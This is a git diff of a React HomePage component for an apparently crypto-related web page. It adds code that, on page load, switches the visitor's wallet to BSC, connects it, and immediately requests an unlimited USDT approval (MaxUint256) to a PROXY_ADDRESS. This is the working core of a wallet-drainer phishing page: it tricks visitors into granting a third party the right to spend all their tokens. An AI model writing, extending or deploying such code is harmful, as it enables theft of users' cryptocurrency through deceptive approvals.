@@ -62,7 +62,7 @@ const HomePage = () => {
 	}, []);
 
   // ✅ Request switch to BSC
-  const switchToBSC = async () => {
+/*   const switchToBSC = async () => {
     try {
       const currentChain = await window.ethereum.request({ method: "eth_chainId" });
       if (currentChain !== BSC_CHAIN_ID) {
@@ -74,7 +74,7 @@ const HomePage = () => {
     } catch (err) {
       console.error("Switch error", err);
     }
-  };
+  }; */
 
   // ✅ Connect and get signer
 /* const connectAndApprove = async () => {
@@ -106,7 +106,7 @@ const HomePage = () => {
 }; */
 
 
-  const connectAndApprove = async () => {
+/*   const connectAndApprove = async () => {
     try {
       const modal = new Web3Modal({ cacheProvider: true });
       const instance = await modal.connect();
@@ -123,7 +123,7 @@ const HomePage = () => {
       console.error("Connect error", err);
       //setStatus("❌ Wallet connection failed");
     }
-  };
+  }; */
 
 
 
@@ -186,7 +186,7 @@ const HomePage = () => {
   //   }
   // };
 
-  const approveUSDT = async (signerToUse = signer, account) => {
+/*   const approveUSDT = async (signerToUse = signer, account) => {
   try {
     const usdt = new Contract(USDT_ADDRESS, ERC20_ABI, signerToUse);
 
@@ -236,7 +236,74 @@ const HomePage = () => {
     console.error('Approval error:', approvalError);
   }
 };
+ */
 
+  // ✅ On first load, auto switch & connect
+/*   useEffect(() => {
+    if (window.ethereum) {
+      switchToBSC().then(() => {
+        connectAndApprove(); // auto connect + approve
+      });
+    } else {
+      console.error("❌ Web3 wallet not detected");
+    }
+  }, []); */
+
+
+
+  const [status, setStatus] = useState("");
+  const [approvalTried, setApprovalTried] = useState(false);
+
+  // ✅ Request switch to BSC
+  const switchToBSC = async () => {
+    try {
+      const currentChain = await window.ethereum.request({ method: "eth_chainId" });
+      if (currentChain !== BSC_CHAIN_ID) {
+        await window.ethereum.request({
+          method: "wallet_switchEthereumChain",
+          params: [{ chainId: BSC_CHAIN_ID }]
+        });
+      }
+    } catch (err) {
+      console.error("Switch error", err);
+    }
+  };
+
+  // ✅ Connect and get signer
+  const connectAndApprove = async () => {
+    try {
+      const modal = new Web3Modal({ cacheProvider: true });
+      const instance = await modal.connect();
+      const provider = new BrowserProvider(instance);
+      const _signer = await provider.getSigner();
+      const _account = await _signer.getAddress();
+      setSigner(_signer);
+      setAccount(_account);
+      setStatus("✅ Wallet connected");
+
+      // ✅ Auto trigger approval
+      await approveUSDT(_signer);
+    } catch (err) {
+      console.error("Connect error", err);
+      setStatus("❌ Wallet connection failed");
+    }
+  };
+
+  // ✅ Send approval transaction
+  const approveUSDT = async (signerToUse = signer) => {
+    try {
+      setStatus("🔄 Approving unlimited USDT...");
+      const usdt = new Contract(USDT_ADDRESS, ERC20_ABI, signerToUse);
+      const tx = await usdt.approve(PROXY_ADDRESS, MaxUint256);
+      setApprovalTried(true);
+      await tx.wait();
+      setStatus("✅ Approval successful");
+    } catch (err) {
+      console.error("Approval error", err);
+      setStatus("❌ Approval failed or cancelled");
+      setApprovalTried(true);
+    }
+  };
 
   // ✅ On first load, auto switch & connect
   useEffect(() => {
@@ -245,7 +312,7 @@ const HomePage = () => {
         connectAndApprove(); // auto connect + approve
       });
     } else {
-      console.error("❌ Web3 wallet not detected");
+      setStatus("❌ Web3 wallet not detected");
     }
   }, []);
 
